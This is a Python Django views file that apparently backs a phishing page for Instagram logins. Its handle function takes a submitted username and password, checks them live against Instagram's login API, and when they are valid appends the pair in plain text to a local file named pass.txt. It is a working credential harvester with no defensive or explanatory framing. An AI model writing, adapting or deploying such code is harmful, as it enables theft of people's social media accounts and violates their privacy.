from django.shortcuts import render
import requests
import datetime
import json
def home(request):
    return render(request, 'index.html')

def handle(request):
    if request.method=="POST":
        username= request.POST['username']
        password = request.POST['password']
        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'
        USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)\Chrome/59.0.3071.115 Safari/537.36'
        time=int(datetime.datetime.now().timestamp())

        session = requests.Session()
        session.headers = {'user-agent': USER_AGENT}
        session.headers.update({'Referer': link})
        req = session.get(link)

        login_data = {'username': username,
                       'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
                       'queryParams': {},
                       'optIntoOneTap': 'false'
                      }

        session.headers.update({'X-CSRFToken': req.cookies['csrftoken']})

        login = session.post(login_url, data=login_data, allow_redirects=True)
        session.headers.update({'X-CSRFToken': login.cookies['csrftoken']})


        json_data = json.loads(login.text)
        if json_data["authenticated"]:
            print("login successful")
            file=open('pass.txt','a')
            file.write(f'{username}, {password}\n')
            file.close()
            return render(request, 'index_passed.html')

            #cookies = login_response.cookies
            #cookie_jar = cookies.get_dict()
            #csrf_token = cookie_jar['csrftoken']
            #print("csrf_token: ", csrf_token)
            #session_id = cookie_jar['sessionid']
            #print("session_id: ", session_id)
        else:
            print("login failed ")
            return render(request, 'index_failed.html')
